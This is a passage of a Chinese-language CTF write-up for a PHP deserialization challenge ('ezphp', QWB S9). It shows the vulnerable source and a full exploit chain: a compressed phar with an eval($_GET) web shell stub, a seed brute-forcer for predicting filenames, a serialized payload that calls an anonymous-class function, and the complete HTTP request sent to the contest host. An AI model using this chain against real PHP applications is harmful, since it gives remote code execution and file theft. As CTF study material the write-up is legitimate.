</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="nv">$uploadedFile</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="nv">$uploadPath</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cp &#34;</span> <span class="o">.</span> <span class="nv">$uploadedFile</span> <span class="o">.</span> <span class="s2">&#34; &#34;</span> <span class="o">.</span> <span class="nv">$uploadPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">echo</span> <span class="s2">&#34;success upload!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">echo</span> <span class="s2">&#34;error</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">phpinfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">public</span> <span class="k">function</span> <span class="nf">readflag</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">function</span> <span class="nf">readflag</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s2">&#34;inner readflag executed.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$file</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/:\/\//&#39;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="nv">$file_content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;uploads/&#34;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="k">echo</span> <span class="s2">&#34;Including &#34;</span> <span class="o">.</span> <span class="nv">$file</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">echo</span> <span class="nv">$file_content</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/&lt;\?|\:\/\/|ph|\?\=/i&#39;</span><span class="p">,</span> <span class="nv">$file_content</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Illegal content detected in the file.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="k">include</span><span class="p">(</span><span class="s2">&#34;uploads/&#34;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$func</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="s1">&#39;class&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">new</span> <span class="nv">$func</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="s1">&#39;func&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$func</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;printfile.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$ser</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;land&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;land&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;O:4:&#34;test&#34;:N&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// $name = $_GET[&#39;name&#39;];
</span></span></span><span class="line"><span class="cl"><span class="c1">// $name();
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>第一个点在于如何调用匿名类中的 <code>readflag</code> 函数，这是实现 <code>include</code> 的关键</p>
<p>参考p牛博客：https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html</p>
<p>保存base64解码后的文件为 test.php，用同款插件分析</p>
<p><img src="/img/2025-QWB-S9/28.png" alt="img"></p>
<p>本地可以用 <code>%00readflag%2Fhome%2Fmingzu%2FCTF%2Fqwb%2Fezphp%2Ftest.php%3A59%241</code> 执行 <code>readflag</code></p>
<p>测试后可从远程环境报错得知 eval 之后的路径是</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">:</span> <span class="n">eval</span><span class="p">()</span><span class="s1">&#39;d code</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>且行号是 1</p>
<p>所以远程可以通过</p>
<p><code>%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241</code> 执行 readflag</p>
<blockquote>
<p>$后面的数字会自增，但是没测出自增的规律，所以猜不到了就重启靶机</p></blockquote>
<p>然后是上传，以及上传后如何绕过 waf</p>
<p>过滤了 <code>&lt; : ph</code> 等等，很极限，所以打 gz 压缩后的 phar</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;exp.phar&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$stub</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">STUB</span><span class="s">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s">    print 123;
</span></span></span><span class="line"><span class="cl"><span class="s">    system(&#39;cat /flag&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s">    system(&#39;/readflag&#39;);
</span></span></span><span class="line"><span class="cl"><span class="s">    eval($_GET[1]);
</span></span></span><span class="line"><span class="cl"><span class="s">    __HALT_COMPILER();
</span></span></span><span class="line"><span class="cl"><span class="s">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s"></span><span class="dl">STUB</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="nv">$stub</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;test&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/29.png" alt="img"></p>
<p>但是上传之后文件名会被重命名，include 去包含 .phar.gz 类文件必须有 phar 字符串的出现，测试后发现 <code>xxxx.pharxxxx.jpg</code> 在 include 时会被正确加载</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="nv">$time</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Hi&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$seed</span> <span class="o">=</span> <span class="nv">$time</span> <span class="o">.</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$randomStr</span> <span class="o">=</span> <span class="nx">generateRandomString</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>所以我们需要控制文件名，由于种子可以预测文件名，所以可以爆破出小时分钟+某个数字的seed，让 generateRandomString 函数输出的前四个是phar</p>
<p>然后将这个种子后缀，也就是我们想要的 $filename 的值，放到 test 实例的 readflag 成员变量中，使得反序列化时全局变量 filename 的值为这个数字</p>
<p>此时触发 upload，则计算出的 file 变量的值就是xxxx.pharxxxx.png</p>
<p>再去调用 readflag 函数，这样就可以触发 phar</p>
<p>但是这种情况下在一分钟内有效，反序列化的 exp 如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">date_default_timezone_set</span><span class="p">(</span><span class="s1">&#39;Asia/Shanghai&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">generateRandomString</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$characters</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$randomString</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$r</span> <span class="o">=</span> <span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$characters</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// echo $r . &#34; &#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$randomString</span> <span class="o">.=</span> <span class="nv">$characters</span><span class="p">[</span><span class="nv">$r</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$randomString</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">brute</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$time</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Hi&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$t</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$t</span><span class="o">&lt;=</span><span class="mi">10000000</span><span class="p">;</span> <span class="nv">$t</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$seed</span> <span class="o">=</span> <span class="nv">$time</span> <span class="o">.</span> <span class="nv">$t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$x</span> <span class="o">=</span> <span class="nx">generateRandomString</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// echo $seed . &#34; &#34; . $x . &#34;\n&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">==</span> <span class="s2">&#34;phar&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$t</span> <span class="o">.</span> <span class="s2">&#34; &#34;</span> <span class="o">.</span> <span class="nv">$seed</span> <span class="o">.</span> <span class="s2">&#34; &#34;</span> <span class="o">.</span> <span class="nx">generateRandomString</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$readflag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$absolute_path</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/index.php(1) : eval()&#39;d code&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$line_number</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// $absolute_path = &#34;/var/www/html/test.php&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1">// $line_number = 59;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$internal_func_name</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\0</span><span class="s2">readflag&#34;</span> <span class="o">.</span> <span class="nv">$absolute_path</span> <span class="o">.</span> <span class="s2">&#34;:&#34;</span> <span class="o">.</span> <span class="nv">$line_number</span> <span class="o">.</span> <span class="s2">&#34;$1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//echo urlencode($internal_func_name) . &#34;\n&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$x</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="s2">&#34;class&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$x</span><span class="o">-&gt;</span><span class="na">f</span> <span class="o">=</span> <span class="s2">&#34;test&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$x</span><span class="o">-&gt;</span><span class="na">readflag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span> <span class="o">.</span> <span class="nx">brute</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$y</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$y</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="s2">&#34;func&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$y</span><span class="o">-&gt;</span><span class="na">f</span> <span class="o">=</span> <span class="nv">$internal_func_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$y</span><span class="o">-&gt;</span><span class="na">readflag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$z</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$z</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">=</span> <span class="s2">&#34;none&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$z</span><span class="o">-&gt;</span><span class="na">f</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$z</span><span class="o">-&gt;</span><span class="na">readflag</span> <span class="o">=</span> <span class="nv">$x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$z</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$payload</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$payload</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>构造的思路是，先 upload 然后 readflag</p>
<p>upload 只能由 __construct 触发，所以 $x 这个实例是固定的，因为在执行 <code>new test()</code> 之前 <code>$GLOBALS['filename']</code> 的值会被 $this-&gt;readflag 这个成员变量覆盖，所以 $x 的 readflag 只能是爆破出的种子后缀</p>
<p><img src="/img/2025-QWB-S9/30.png" alt="img"></p>
<p>$y 的构造思路也很简单，就是使用 <code>\0</code> 开头的函数名直接执行位于第一行的函数 readflag，实现文件包含</p>
<p><code>class</code> 和 <code>func</code> 两个功能的调用都是依赖于 test 类的 __destruct，所以需要另外一个实例来调一下这两个的触发顺序，先反序列化的会后销毁，所以将 $y 放在 $x 前面，就能使得 $x 对应的 upload 先触发，$y 对应的 readflag 后触发，上传的时候就要触发</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/index.php?land=O%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A6%3A%22510868%22%3Bs%3A1%3A%22f%22%3Bs%3A4%3A%22test%22%3Bs%3A3%3A%22key%22%3Bs%3A5%3A%22class%22%3B%7Ds%3A1%3A%22f%22%3BO%3A4%3A%22test%22%3A3%3A%7Bs%3A8%3A%22readflag%22%3Bs%3A0%3A%22%22%3Bs%3A1%3A%22f%22%3Bs%3A55%3A%22%00readflag%2Fvar%2Fwww%2Fhtml%2Findex.php%281%29+%3A+eval%28%29%27d+code%3A1%241%22%3Bs%3A3%3A%22key%22%3Bs%3A4%3A%22func%22%3B%7Ds%3A3%3A%22key%22%3Bs%3A4%3A%22none%22%3B%7D&amp;1=phpinfo();</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">eci-2zec4wcd4d3ndjtuqk53.cloudeci1.ichunqiu.com:80</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryMvFc5zDkBcoa1yiL</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">138</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryMvFc5zDkBcoa1yiL
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;119738&#34;
</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{{file:line(C:\Users\baozhongqi\Desktop\final.phar.gz)}}
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryMvFc5zDkBcoa1yiL--
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/img/2025-QWB-S9/31.png" alt="img"></p>
<p>读取 /flag 不成功，suid 提权即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
